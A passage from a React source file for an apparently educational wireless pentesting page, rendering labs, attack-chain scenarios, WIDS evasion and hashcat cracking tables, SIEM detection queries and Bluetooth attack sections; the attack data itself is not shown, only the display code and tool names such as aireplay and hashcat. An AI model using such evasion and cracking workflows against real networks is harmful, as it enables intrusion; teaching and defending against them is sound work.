                      <Typography variant="body2" color="text.secondary">
                        ğŸ’¡ {step.notes}
                      </Typography>
                    </StepContent>
                  </Step>
                ))}
              </Stepper>

              {/* Success Criteria */}
              <Typography variant="subtitle1" fontWeight="bold" color="success.main" gutterBottom>
                âœ… Success Criteria
              </Typography>
              <List dense sx={{ mb: 2 }}>
                {lab.successCriteria.map((criteria, idx) => (
                  <ListItem key={idx}>
                    <ListItemIcon><CheckCircleIcon color="success" fontSize="small" /></ListItemIcon>
                    <ListItemText primary={criteria} primaryTypographyProps={{ variant: "body2" }} />
                  </ListItem>
                ))}
              </List>

              {/* Troubleshooting */}
              <Typography variant="subtitle1" fontWeight="bold" color="warning.main" gutterBottom>
                ğŸ”§ Troubleshooting
              </Typography>
              <TableContainer component={Paper} variant="outlined">
                <Table size="small">
                  <TableHead>
                    <TableRow sx={{ bgcolor: "action.hover" }}>
                      <TableCell><strong>Problem</strong></TableCell>
                      <TableCell><strong>Solution</strong></TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {lab.troubleshooting.map((ts, idx) => (
                      <TableRow key={idx}>
                        <TableCell>
                          <Typography variant="body2" color="error">{ts.problem}</Typography>
                        </TableCell>
                        <TableCell>
                          <Typography variant="body2">{ts.solution}</Typography>
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </TableContainer>
            </AccordionDetails>
          </Accordion>
        ))}

        <Divider sx={{ my: 4 }} />

        {/* Practice Network Designs */}
        <Typography variant="h5" gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
          <RouterIcon color="secondary" />
          Build Your Own Practice Network
        </Typography>
        <Typography paragraph color="text.secondary">
          Design your own wireless security lab. These reference architectures show how to build
          increasingly complex environments for learning different attack techniques.
        </Typography>

        <Grid container spacing={3}>
          {practiceNetworkDesigns.map((design, idx) => (
            <Grid item xs={12} key={idx}>
              <Card variant="outlined">
                <CardContent>
                  <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", mb: 2 }}>
                    <Box>
                      <Typography variant="h6" fontWeight="bold">{design.name}</Typography>
                      <Typography variant="body2" color="text.secondary">
                        Estimated Cost: {design.cost}
                      </Typography>
                    </Box>
                    <Chip 
                      label={design.difficulty} 
                      color={design.difficulty === "Beginner" ? "success" : design.difficulty === "Intermediate" ? "warning" : "error"} 
                    />
                  </Box>

                  <Paper sx={{ p: 2, bgcolor: "grey.900", overflow: "auto", mb: 2 }}>
                    <Typography
                      component="pre"
                      sx={{
                        fontFamily: "monospace",
                        fontSize: "0.65rem",
                        lineHeight: 1.2,
                        color: "info.light",
                        whiteSpace: "pre",
                        m: 0,
                      }}
                    >
                      {design.diagram}
                    </Typography>
                  </Paper>

                  <Typography variant="subtitle2" gutterBottom>Learning Goals:</Typography>
                  <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap" }}>
                    {design.learningGoals.map((goal) => (
                      <Chip key={goal} label={goal} size="small" variant="outlined" color="primary" />
                    ))}
                  </Box>
                </CardContent>
              </Card>
            </Grid>
          ))}
        </Grid>

        <Divider sx={{ my: 4 }} />

        {/* Original Quick Labs */}
        <Typography variant="h5" gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
          <SpeedIcon color="warning" />
          Quick Practice Labs
        </Typography>
        <Typography paragraph color="text.secondary">
          Shorter exercises for targeted skill practice. Each can be completed in under an hour.
        </Typography>

        <Grid container spacing={2} sx={{ mb: 4 }}>
          {labExercises.map((lab, idx) => (
            <Grid item xs={12} md={6} key={lab.title}>
              <Accordion>
                <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                  <Box sx={{ display: "flex", alignItems: "center", gap: 1, width: "100%" }}>
                    <Chip label={`Lab ${idx + 1}`} size="small" color="primary" />
                    <Typography fontWeight="bold" sx={{ flex: 1 }}>{lab.title}</Typography>
                    <Chip 
                      label={lab.level} 
                      size="small" 
                      color={lab.level === "Beginner" ? "success" : lab.level === "Intermediate" ? "warning" : "error"} 
                      sx={{ mr: 1 }}
                    />
                    <Chip label={lab.time} size="small" variant="outlined" />
                  </Box>
                </AccordionSummary>
                <AccordionDetails>
                  <Typography variant="body2" color="text.secondary" paragraph>
                    <strong>Objective:</strong> {lab.objective}
                  </Typography>
                  <Typography variant="body2" color="text.secondary" paragraph>
                    <strong>Setup:</strong> {lab.setup}
                  </Typography>
                  <Typography variant="subtitle2" gutterBottom>Required Tools:</Typography>
                  <Box sx={{ display: "flex", gap: 0.5, flexWrap: "wrap", mb: 2 }}>
                    {lab.tools.map(tool => (
                      <Chip key={tool} label={tool} size="small" variant="outlined" />
                    ))}
                  </Box>
                  <Typography variant="subtitle2" gutterBottom>Steps:</Typography>
                  <List dense>
                    {lab.steps.map((step, i) => (
                      <ListItem key={i}>
                        <ListItemIcon><Chip label={i + 1} size="small" /></ListItemIcon>
                        <ListItemText 
                          primary={<Typography variant="body2" sx={{ fontFamily: step.includes("airmon") || step.includes("aireplay") || step.includes("hashcat") ? "monospace" : "inherit" }}>{step}</Typography>} 
                        />
                      </ListItem>
                    ))}
                  </List>
                  <Alert severity="success" sx={{ mt: 2 }}>
                    <strong>Learning Outcome:</strong> {lab.learningOutcome}
                  </Alert>
                </AccordionDetails>
              </Accordion>
            </Grid>
          ))}
        </Grid>

        <Divider sx={{ my: 3 }} />

        <Typography variant="h6" gutterBottom>Advanced Attack Scenarios</Typography>
        <Typography paragraph color="text.secondary">
          These multi-step attack chains demonstrate real-world wireless penetration testing workflows.
        </Typography>

        {advancedAttackScenarios.map((scenario) => (
          <Accordion key={scenario.name}>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Box sx={{ display: "flex", alignItems: "center", gap: 1, width: "100%" }}>
                <BugReportIcon color="error" />
                <Typography fontWeight="bold" sx={{ flex: 1 }}>{scenario.name}</Typography>
                <Chip label={scenario.difficulty} size="small" color={scenario.difficulty === "Intermediate" ? "warning" : "error"} sx={{ mr: 1 }} />
                <Chip label={scenario.time} size="small" variant="outlined" />
              </Box>
            </AccordionSummary>
            <AccordionDetails>
              <Typography variant="body2" color="text.secondary" paragraph>
                <strong>Prerequisites:</strong> {scenario.prerequisites.join(", ")}
              </Typography>
              
              <Typography variant="subtitle2" gutterBottom>Attack Chain:</Typography>
              <Stepper orientation="vertical" sx={{ mb: 2 }}>
                {scenario.steps.map((step) => (
                  <Step key={step.step} active completed={false}>
                    <StepLabel>
                      <Typography fontWeight="bold">{step.action}</Typography>
                    </StepLabel>
                    <StepContent>
                      <Typography variant="body2" color="text.secondary">{step.detail}</Typography>
                    </StepContent>
                  </Step>
                ))}
              </Stepper>

              <Grid container spacing={2}>
                <Grid item xs={12} md={6}>
                  <Alert severity="warning">
                    <strong>Detection:</strong> {scenario.detection}
                  </Alert>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Alert severity="success">
                    <strong>Mitigation:</strong> {scenario.mitigation}
                  </Alert>
                </Grid>
              </Grid>
            </AccordionDetails>
          </Accordion>
        ))}

        <Divider sx={{ my: 3 }} />

        <Typography variant="h6" gutterBottom>WIDS/WIPS Evasion Techniques</Typography>
        <Alert severity="warning" sx={{ mb: 2 }}>
          Understanding evasion helps both attackers (for testing) and defenders (for improving detection).
        </Alert>
        
        <TableContainer component={Paper}>
          <Table size="small">
            <TableHead>
              <TableRow sx={{ bgcolor: "action.hover" }}>
                <TableCell><strong>Technique</strong></TableCell>
                <TableCell><strong>Description</strong></TableCell>
                <TableCell><strong>Effectiveness</strong></TableCell>
                <TableCell><strong>Counter-Detection</strong></TableCell>
              </TableRow>
            </TableHead>
            <TableBody>
              {widsEvasionTechniques.map((tech) => (
                <TableRow key={tech.technique}>
                  <TableCell>
                    <Typography variant="subtitle2" fontWeight="bold" color="primary">{tech.technique}</Typography>
                  </TableCell>
                  <TableCell>
                    <Typography variant="body2">{tech.description}</Typography>
                    <Typography variant="caption" sx={{ fontFamily: "monospace", display: "block", mt: 0.5, color: "text.secondary" }}>{tech.command}</Typography>
                  </TableCell>
                  <TableCell>
                    <Chip 
                      label={tech.effectiveness} 
                      size="small" 
                      color={tech.effectiveness === "High" ? "error" : tech.effectiveness === "Medium" ? "warning" : "info"} 
                    />
                  </TableCell>
                  <TableCell><Typography variant="body2" color="text.secondary">{tech.detection}</Typography></TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </TableContainer>

        <Divider sx={{ my: 3 }} />

        <Typography variant="h6" gutterBottom>Hashcat Optimization for WiFi Cracking</Typography>
        <TableContainer component={Paper}>
          <Table size="small">
            <TableHead>
              <TableRow sx={{ bgcolor: "action.hover" }}>
                <TableCell><strong>Optimization</strong></TableCell>
                <TableCell><strong>Impact</strong></TableCell>
                <TableCell><strong>Command Example</strong></TableCell>
              </TableRow>
            </TableHead>
            <TableBody>
              {hashcatOptimization.map((opt) => (
                <TableRow key={opt.tip}>
                  <TableCell><Typography variant="subtitle2" fontWeight="bold">{opt.tip}</Typography></TableCell>
                  <TableCell><Chip label={opt.impact} size="small" color="success" variant="outlined" /></TableCell>
                  <TableCell><Typography variant="body2" sx={{ fontFamily: "monospace", fontSize: "0.75rem" }}>{opt.command}</Typography></TableCell>
                </TableRow>
              ))}
            </TableBody>
          </Table>
        </TableContainer>
      </TabPanel>

      {/* Tab 9: SIEM Detection */}
      <TabPanel value={tabValue} index={10}>
        <Typography variant="h5" gutterBottom>SIEM Detection Queries</Typography>
        
        <Alert severity="info" sx={{ mb: 3 }}>
          <AlertTitle>Blue Team Perspective</AlertTitle>
          These queries help defenders detect wireless attacks. Understanding detection helps pentesters 
          know what to avoid, and helps blue teams improve their monitoring.
        </Alert>

        <Typography variant="h6" gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
          <StorageIcon /> Splunk Queries
        </Typography>
        {siemDetectionQueries.splunk.map((query) => (
          <Accordion key={query.name} sx={{ mb: 1 }}>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">{query.name}</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Typography variant="body2" color="text.secondary" paragraph>{query.description}</Typography>
              <CodeBlock title="Splunk Query">{query.query}</CodeBlock>
            </AccordionDetails>
          </Accordion>
        ))}

        <Typography variant="h6" gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1, mt: 3 }}>
          <StorageIcon /> Microsoft Sentinel (KQL)
        </Typography>
        {siemDetectionQueries.sentinel.map((query) => (
          <Accordion key={query.name} sx={{ mb: 1 }}>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">{query.name}</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Typography variant="body2" color="text.secondary" paragraph>{query.description}</Typography>
              <CodeBlock title="KQL Query">{query.query}</CodeBlock>
            </AccordionDetails>
          </Accordion>
        ))}

        <Typography variant="h6" gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1, mt: 3 }}>
          <StorageIcon /> Elastic Security
        </Typography>
        {siemDetectionQueries.elastic.map((query) => (
          <Accordion key={query.name} sx={{ mb: 1 }}>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Typography fontWeight="bold">{query.name}</Typography>
            </AccordionSummary>
            <AccordionDetails>
              <Typography variant="body2" color="text.secondary" paragraph>{query.description}</Typography>
              <CodeBlock title="Elastic DSL">{query.query}</CodeBlock>
            </AccordionDetails>
          </Accordion>
        ))}

        <Divider sx={{ my: 3 }} />

        <Typography variant="h6" gutterBottom>Real-World Case Studies</Typography>
        <Grid container spacing={2}>
          {caseStudies.map((study) => (
            <Grid item xs={12} md={6} key={study.title}>
              <Card variant="outlined" sx={{ height: "100%" }}>
                <CardContent>
                  <Box sx={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", mb: 1 }}>
                    <Typography variant="subtitle1" fontWeight="bold" color="primary">{study.title}</Typography>
                    <Chip label={study.type} size="small" color="error" />
                  </Box>
                  <Typography variant="body2" color="error" paragraph>
                    <strong>Impact:</strong> {study.impact}
                  </Typography>
                  <Typography variant="body2" paragraph>
                    <strong>Attack Vector:</strong> {study.attackVector}
                  </Typography>
                  <Typography variant="subtitle2" gutterBottom>Key Lessons:</Typography>
                  <List dense>
                    {study.lessons.map((lesson) => (
                      <ListItem key={lesson} sx={{ py: 0 }}>
                        <ListItemIcon><CheckCircleIcon fontSize="small" color="success" /></ListItemIcon>
                        <ListItemText primary={<Typography variant="body2">{lesson}</Typography>} />
                      </ListItem>
                    ))}
                  </List>
                  <Typography variant="caption" color="text.secondary">
                    Timeline: {study.timeline}
                  </Typography>
                </CardContent>
              </Card>
            </Grid>
          ))}
        </Grid>

        <Divider sx={{ my: 3 }} />

        <Typography variant="h6" gutterBottom>Advanced Bluetooth Attacks (Detailed)</Typography>
        {advancedBluetoothAttacks.map((attack) => (
          <Accordion key={attack.name}>
            <AccordionSummary expandIcon={<ExpandMoreIcon />}>
              <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                <BluetoothIcon color="primary" />
                <Typography fontWeight="bold">{attack.name}</Typography>
              </Box>
            </AccordionSummary>
            <AccordionDetails>
              <Typography variant="body2" paragraph>{attack.description}</Typography>
              <Typography variant="subtitle2" gutterBottom>Attack Steps:</Typography>
              <List dense>
                {attack.steps.map((step, i) => (
                  <ListItem key={i}>
                    <ListItemIcon><Chip label={i + 1} size="small" /></ListItemIcon>
                    <ListItemText primary={step} />
                  </ListItem>
                ))}
              </List>
              <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap", my: 2 }}>
                <Typography variant="subtitle2">Tools:</Typography>
                {attack.tools.map(tool => (
                  <Chip key={tool} label={tool} size="small" variant="outlined" />
                ))}
              </Box>
              <Alert severity="success">
                <strong>Defense:</strong> {attack.defense}
              </Alert>
            </AccordionDetails>
          </Accordion>
        ))}
      </TabPanel>
    </Box>

      {/* Bottom Navigation */}
      <Box sx={{ mt: 4, textAlign: "center" }}>
        <Button
          component={Link}
          to="/learn"
          variant="outlined"
          startIcon={<ArrowBackIcon />}
          sx={{ borderColor: "#8b5cf6", color: "#8b5cf6" }}
        >
          Back to Learning Hub
        </Button>
      </Box>
    </LearnPageLayout>
  );
};

export default WirelessPentestingPage;
